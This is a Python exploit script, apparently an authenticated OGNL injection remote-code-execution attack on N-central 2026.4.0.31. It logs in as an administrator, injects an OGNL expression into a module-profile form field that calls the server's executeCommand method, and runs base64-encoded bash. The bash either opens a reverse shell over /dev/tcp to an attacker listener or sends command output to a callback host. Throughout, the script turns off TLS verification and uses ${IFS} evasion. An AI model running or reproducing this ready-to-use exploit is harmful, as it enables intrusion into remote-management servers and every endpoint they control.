#!/usr/bin/env python3
import argparse
import base64
import getpass
import os

import requests
import urllib3
from pwn import context, listen


def main():
    p = argparse.ArgumentParser(description="N-central 2026.4.0.31 authenticated OGNL RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host")
    p.add_argument("--callback-port", type=int, default=9000)
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int, default=4444)
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    context.log_level = "error"
    if a.lhost:
        receiver = listen(a.lport, bindaddr=a.listen_host, timeout=60)
        command = f"/bin/bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
    else:
        if not a.callback_host:
            p.error("--callback-host is required unless --lhost is used")
        receiver = listen(a.callback_port, bindaddr=a.listen_host, timeout=60)
        command64 = base64.b64encode(a.command.encode()).decode()
        command = (
            f"out=$(echo {command64}|base64 -d|/bin/bash 2>&1);"
            f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};"
            "printf '%s\\n' \"$out\" >&3"
        )

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    s.verify = False
    target = a.target.rstrip("/")
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")

    encoded = base64.b64encode(command.encode()).decode()
    runtime = f"/bin/bash -c echo${{IFS}}{encoded}|/usr/bin/base64${{IFS}}-d|/bin/bash"
    expression = (
        "new com.nable.dms.core.service.system.impl.ProcessServiceImpl()"
        f".executeCommand('{runtime}', 120000L)"
    )
    response = s.post(
        target + "/saveModuleSecurityManagerProfilesAction.action",
        headers={"X-Requested-With": "XMLHttpRequest"},
        data={"ncentralTabId": "main", "currentModule": expression},
        timeout=130,
    )
    print(f"login={login.status_code}")
    print(f"trigger={response.status_code}")
    receiver.wait_for_connection()
    if receiver.sock is None:
        raise RuntimeError("callback was not received")
    if a.lhost:
        receiver.interactive()
    else:
        print(receiver.recvall(timeout=10).decode(errors="replace").strip())


if __name__ == "__main__":
    main()
